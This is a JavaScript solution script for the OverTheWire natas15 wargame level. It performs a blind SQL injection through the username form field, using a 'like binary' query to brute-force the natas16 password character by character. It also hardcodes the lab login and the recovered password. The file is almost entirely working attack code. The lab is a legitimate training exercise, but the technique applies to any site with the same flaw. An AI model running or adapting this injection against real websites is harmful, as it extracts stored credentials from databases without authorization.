// Current Level: natas15
// i.e. Finding the passcode for level natas16

const fetch = require('node-fetch');
const FormData = require('form-data');
const base64 = require('base-64');

URL = "http://natas15.natas.labs.overthewire.org/index.php";
username = "natas15";
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J";

// create headers for passing the authentication credentials for current level: 15
const headers = new fetch.Headers();
headers.set('Authorization', 'Basic ' + base64.encode(username + ":" + password));

const MAXLEN = 32;			// length of natas passwords
const startCharCode = 48;	// ascii code for '0'
const endCharCode = 122;	// ascii code for 'z'
let pass = "";
let moveOn = false;
let found = false;
	
(async function run(){	
	while (true){
		const lastChar = pass.slice(-1).toString();
		const lastCharCode = lastChar.charCodeAt(0);
		if(moveOn){
			if(pass.length >= MAXLEN){
				break
			}
			moveOn = false;
			pass += String.fromCharCode(startCharCode);	
		}
		else if(!lastCharCode || lastCharCode >= endCharCode){
			moveOn = true;
			continue;
		}
		else{
			const nextChar = String.fromCharCode(lastCharCode+1);
			pass
				= pass.slice(0, -1).toString()
				+ nextChar
			if(/\%|\_/.test(nextChar)){
				continue;
			}
		}
		found = false;

		const form = new FormData();
		/**
			'Like' operator for having Regex
			'Binary' for having case-sensitive
		*/
		const query = `natas16" and password like binary "${pass}%" -- `;
		form.append('username', query);

		const resp = await fetch(URL, {
			method: "POST",
			body: form,
			headers,
		});
		const res = await resp.text();
		if(/This user exist/.test(res)){
			moveOn = true;
			found = true;
			console.log(pass);
		}
	}
	if(found){
		console.log("PASSWORD: " + pass); // WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
	}
	else{
		console.log("Oops...");
	}
})();
